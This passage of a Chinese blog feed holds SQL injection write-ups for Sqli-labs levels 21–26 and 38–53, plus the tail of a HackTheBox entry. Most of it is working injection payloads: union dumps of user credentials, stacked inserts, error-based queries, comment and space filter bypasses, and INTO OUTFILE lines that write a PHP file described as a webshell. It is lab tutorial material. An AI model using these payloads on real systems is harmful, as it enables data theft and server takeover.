</span><br><span class="line">***************************</span><br><span class="line">root@Delivery:~#</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL2ludGlncml0aS9ob3ctaS1oYWNrZWQtaHVuZHJlZHMtb2YtY29tcGFuaWVzLXRocm91Z2gtdGhlaXItaGVscGRlc2stYjc2ODBkZGMyZDRj">大佬的灵感respect<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/02/04/HTB-delivery/image-20210203224703300.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page3(stacked)</title>
    <link href="https://lunamoore.github.io/2021/02/02/Sqli-labs-Page3-stack/"/>
    <id>https://lunamoore.github.io/2021/02/02/Sqli-labs-Page3-stack/</id>
    <published>2021-02-02T03:38:50.000Z</published>
    <updated>2021-02-02T03:49:07.830Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page3(stacked)</strong></p><p><strong>本篇大部分考察堆叠注入</strong></p><a id="more"></a><h2 id="0x01-Less-38-GET-堆叠注入-单引号"><a href="#0x01-Less-38-GET-堆叠注入-单引号" class="headerlink" title="0x01.Less-38 GET 堆叠注入 单引号"></a>0x01.Less-38 GET 堆叠注入 单引号</h2><p><code>使用堆叠注入可以进行增删改查等操作</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),3;insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure><p><code>爆库爆表爆字段等操作不在赘述，先查看未注入之前的数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130856987.png" class><p><code>再查看注入之后的数据</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130944171.png" class><h2 id="0x02-Less-39-GET-堆叠注入-整型"><a href="#0x02-Less-39-GET-堆叠注入-整型" class="headerlink" title="0x02.Less-39 GET 堆叠注入 整型"></a>0x02.Less-39 GET 堆叠注入 整型</h2><p><code>同less-38，将单引号去掉即可</code></p><h2 id="0x03-Less-40-GET-基于bool-堆叠注入-单引号-括号"><a href="#0x03-Less-40-GET-基于bool-堆叠注入-单引号-括号" class="headerlink" title="0x03.Less-40 GET 基于bool 堆叠注入 单引号+括号"></a>0x03.Less-40 GET 基于bool 堆叠注入 单引号+括号</h2><p><code>bool注入不在赘述，使用如下payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure><p><code>查看，可以看到插入成功</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201133805018.png" class><h2 id="0x04-Less-41-GET-基于bool-堆叠注入-整型"><a href="#0x04-Less-41-GET-基于bool-堆叠注入-整型" class="headerlink" title="0x04.Less-41 GET 基于bool 堆叠注入 整型"></a>0x04.Less-41 GET 基于bool 堆叠注入 整型</h2><p><code>同less-40，去掉&#39;)即可</code></p><h2 id="0x05-Less-42-POST-基于报错-堆叠注入"><a href="#0x05-Less-42-POST-基于报错-堆叠注入" class="headerlink" title="0x05.Less-42 POST 基于报错 堆叠注入"></a>0x05.Less-42 POST 基于报错 堆叠注入</h2><p><code>这里点击注册用户出现如下页面</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201135038039.png" class><p><code>查看源码发现，password没有进行过滤，此处可以进行注入</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p><code>测试发现闭合字符为单引号</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201141358328.png" class><p><code>注入</code></p><blockquote><p>这里没有想到好的办法进行爆库爆表爆字段（菜是原罪。。。）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(55,&#39;de&#39;,&#39;de&#39;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142502360.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142524651.png" class><h2 id="0x06-Less-43-POST-基于报错-堆叠注入-单引号-括号"><a href="#0x06-Less-43-POST-基于报错-堆叠注入-单引号-括号" class="headerlink" title="0x06.Less-43 POST 基于报错 堆叠注入 单引号+括号"></a>0x06.Less-43 POST 基于报错 堆叠注入 单引号+括号</h2><p><code>同less-42，将单引号换为&#39;)即可</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(66,&#39;ha&#39;,&#39;ha&#39;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201143741102.png" class><h2 id="0x07-Less-44-POST-基于报错-堆叠注入blind"><a href="#0x07-Less-44-POST-基于报错-堆叠注入blind" class="headerlink" title="0x07.Less-44 POST 基于报错 堆叠注入blind"></a>0x07.Less-44 POST 基于报错 堆叠注入blind</h2><p><code>同less42，但此处&#39;无回显</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(32,&#x27;demo&#x27;,&#x27;demo&#x27;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201144925798.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145028708.png" class><h2 id="0x08-Less-45-POST-基于报错-堆叠注入blind"><a href="#0x08-Less-45-POST-基于报错-堆叠注入blind" class="headerlink" title="0x08.Less-45 POST 基于报错 堆叠注入blind"></a>0x08.Less-45 POST 基于报错 堆叠注入blind</h2><p><code>同less42，闭合字符为&#39;)，仍然无回显</code></p><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145317106.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145302646.png" class><h2 id="0x09-Less-46-GET-基于报错-数字-order-by"><a href="#0x09-Less-46-GET-基于报错-数字-order-by" class="headerlink" title="0x09.Less-46 GET 基于报错 数字 order by"></a>0x09.Less-46 GET 基于报错 数字 order by</h2><p><code>查看源码发现sql语句如下</code></p><blockquote><p>order by 不同于where，order by 后不能拼接union</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>直接构造报错语句，其他过程不在赘述</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201233943796.png" class><p><strong>skip</strong></p><p><code>这里可以使用into outfile配合lines  terminated by 0x写入webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and into outfile &quot;C:\\phpStudy\\WWW\\less46.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure><blockquote><p>这里由于没有权限所以失败了，但这也是一个不错的思路。</p></blockquote><h2 id="0x10-Less-47-GET-基于报错-字符-order-by"><a href="#0x10-Less-47-GET-基于报错-字符-order-by" class="headerlink" title="0x10.Less-47 GET 基于报错 字符 order by"></a>0x10.Less-47 GET 基于报错 字符 order by</h2><p><code>同上，闭合字符为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=0&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202000047262.png" class><h2 id="0x11-Less-48-GET-基于bool-数字-order-by"><a href="#0x11-Less-48-GET-基于bool-数字-order-by" class="headerlink" title="0x11.Less-48 GET 基于bool 数字 order by"></a>0x11.Less-48 GET 基于bool 数字 order by</h2><p><code>这里使用rand()函数进行回显判断</code></p><blockquote><p>rand(0)如下</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001551841.png" class><blockquote><p>rand(1)如下</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001610943.png" class><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(left((select database()),1)=&#x27;a&#x27;)</span><br><span class="line">?sort=rand(left((select database()),1)=&#x27;s&#x27;)</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001526992.png" class><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202001730347.png" class><blockquote><p>其他过程不在赘述</p></blockquote><h2 id="0x12-Less-49-GET-基于bool-字符-order-by"><a href="#0x12-Less-49-GET-基于bool-字符-order-by" class="headerlink" title="0x12.Less-49 GET 基于bool 字符 order by"></a>0x12.Less-49 GET 基于bool 字符 order by</h2><p><code>同上，闭合字符为单引号，本次使用导出文件上传webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27; and into outfile &quot;/var/www/html/Less-49/demo.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure><blockquote><p>这里3c3f7068700a706870696e666f28293b0a3f3e为<?php phpinfo();?>的16进制</p></blockquote><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202004930920.png" class><h2 id="0x13-Less-50-基于报错-GET-order-by-数字-堆叠注入"><a href="#0x13-Less-50-基于报错-GET-order-by-数字-堆叠注入" class="headerlink" title="0x13.Less-50 基于报错 GET order by 数字 堆叠注入"></a>0x13.Less-50 基于报错 GET order by 数字 堆叠注入</h2><p><code>查看源码发现，将mysql_query()函数换为了mysqli_multi_query()函数 ，可以多语句查询，所以可以使用堆叠注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table demo like users; -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202111325863.png" class><p><code>其他过程不在赘述</code></p><h2 id="0x014-Less-51-基于报错-GET-order-by-字符-堆叠注入"><a href="#0x014-Less-51-基于报错-GET-order-by-字符-堆叠注入" class="headerlink" title="0x014.Less-51 基于报错 GET order by 字符 堆叠注入"></a>0x014.Less-51 基于报错 GET order by 字符 堆叠注入</h2><p><code>同上，闭合字符为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table demo like users; -- -</span><br></pre></td></tr></table></figure><h2 id="0x15-Less-52-基于bool-GET-order-by-数字-堆叠注入"><a href="#0x15-Less-52-基于bool-GET-order-by-数字-堆叠注入" class="headerlink" title="0x15.Less-52 基于bool GET order by 数字 堆叠注入"></a>0x15.Less-52 基于bool GET order by 数字 堆叠注入</h2><p><code>同上直接堆叠注入即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table hade like users; -- -</span><br></pre></td></tr></table></figure><img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210202112340757.png" class><h2 id="0x16-Less-53-基于bool-GET-order-by-字符-堆叠注入"><a href="#0x16-Less-53-基于bool-GET-order-by-字符-堆叠注入" class="headerlink" title="0x16.Less-53 基于bool GET order by 字符 堆叠注入"></a>0x16.Less-53 基于bool GET order by 字符 堆叠注入</h2><p><code>同上，闭合字符为单引号，直接堆叠注入即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table qq like users; -- -</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page3(stacked)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本篇大部分考察堆叠注入&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page2(advance)</title>
    <link href="https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/"/>
    <id>https://lunamoore.github.io/2021/01/19/Sqli-labs-Page2-adv/</id>
    <published>2021-01-19T03:24:02.000Z</published>
    <updated>2021-01-19T03:42:51.669Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page2(advance)</strong></p><p> <strong>skip:基础篇环境为windows，但在提高篇有些关卡会出现解析错误，本篇使用docker搭建的Linux环境</strong></p><a id="more"></a><h2 id="0x01-Less-21-Cookie注入-base64编码-单引号加括号"><a href="#0x01-Less-21-Cookie注入-base64编码-单引号加括号" class="headerlink" title="0x01.Less-21 Cookie注入 base64编码 单引号加括号"></a>0x01.Less-21 Cookie注入 base64编码 单引号加括号</h2><p><code>demo payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) order by 4 -- -</span><br><span class="line">YWRtaW4nKSBvcmRlciBieSA0IC0tIC0=</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142128479.png" class><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;) union select 1,2,database() -- -</span><br><span class="line">MCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSAtLSAt</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142319509.png" class><blockquote><p>其他方式不在赘述</p></blockquote><h2 id="0x02-Less-22-Cookie注入-base64编码-双引号"><a href="#0x02-Less-22-Cookie注入-base64编码-双引号" class="headerlink" title="0x02.Less-22 Cookie注入 base64编码 双引号"></a>0x02.Less-22 Cookie注入 base64编码 双引号</h2><blockquote><p>同Less-21，将闭合字符换为双引号即可</p></blockquote><h2 id="0x03-Less-23-基于报错-过滤注释"><a href="#0x03-Less-23-基于报错-过滤注释" class="headerlink" title="0x03.Less-23 基于报错 过滤注释"></a>0x03.Less-23 基于报错 过滤注释</h2><p><code>此题过滤了--和#，测试发现闭合字符为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145228775.png" class><p><code>既然过滤了注释符那么就可以使用二次注入结合%00进行截断</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4;%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145628665.png" class><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),user();%00</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145754610.png" class><blockquote><p>其他方法不在赘述</p></blockquote><p><code>也可使用以下方法</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,database() &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150158281.png" class><p><code>爆表，以下两个payload均可以</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150637871.png" class><p><code>爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151251994.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151415888.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select username from users limit 0,1),3 &#x27;</span><br><span class="line">?id=0&#x27; union select 1,(select password from users limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;1&#x27; = &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151653100.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151801467.png" class><h2 id="0x04-Less-24-二次注入"><a href="#0x04-Less-24-二次注入" class="headerlink" title="0x04.Less-24 二次注入"></a>0x04.Less-24 二次注入</h2><p><code>页面可以注册用户</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152202362.png" class><blockquote><p>思路为注册一个admin’ – -或admin’# 用户，然后再进行修改密码操作</p></blockquote><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152940647.png" class><p><code>admin&#39; -- -登入</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153011802.png" class><p><code>修改密码</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153045305.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153058942.png" class><p><code>退出使用admin登入</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153139415.png" class><h2 id="0x05-Less-25-GET-基于报错-过滤and与or-单引号"><a href="#0x05-Less-25-GET-基于报错-过滤and与or-单引号" class="headerlink" title="0x05.Less-25 GET 基于报错 过滤and与or 单引号"></a>0x05.Less-25 GET 基于报错 过滤and与or 单引号</h2><p><code>过滤了and与or可以使用双写、大小写混合、内联注释、url全编码进行绕过；and与or可以使用逻辑运算符(|| &amp;&amp;)进行代替</code></p><blockquote><p>测试发现只能使用双写</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116155639053.png" class><blockquote><p>其他过程不在赘述</p></blockquote><h2 id="0x06-Less-25a-GET-基于bool-过滤and与or"><a href="#0x06-Less-25a-GET-基于bool-过滤and与or" class="headerlink" title="0x06.Less-25a GET 基于bool 过滤and与or"></a>0x06.Less-25a GET 基于bool 过滤and与or</h2><p><code>与Less-25相似，但没有单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 aandnd if(length(database())=8,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">也可以使用union联合查询</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116161933977.png" class><blockquote><p>其他过程不在赘述</p></blockquote><h2 id="0x07-Less-26-GET-基于报错-过滤空格与字符"><a href="#0x07-Less-26-GET-基于报错-过滤空格与字符" class="headerlink" title="0x07.Less-26 GET 基于报错 过滤空格与字符"></a>0x07.Less-26 GET 基于报错 过滤空格与字符</h2><p><code>查看源码，发现过滤了以下字符</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>测试闭合字符，由于过滤了空格，所以使用%a0或%0b代替空格，这里发现单引号为闭合字符</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;2</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215557295.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215623266.png" class><p><code>测试字段数，结果为4个</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3,4%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220053016.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220136142.png" class><p><code>爆库，and可以换为or</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml%0b(1,concat(0x7e,(select%0bdatabase()),0x7e),3)%0baandnd &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221324429.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0btable_name%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()%0blimit%0b3,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221948346.png" class><p><code>爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b1,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b2,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222502329.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222540036.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0busername%0bfrom%0busers%0blimit%0b0,1),0x7e),1)%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">0&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222910222.png" class><p><code>但是这种方法只能一个一个爆，可以使用group_concat()函数</code></p><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,database()%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;union%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1    // %26为&amp;</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224140184.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224638239.png" class><p><code>爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_name=&#x27;users&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117225229097.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b%271%27=%271</span><br><span 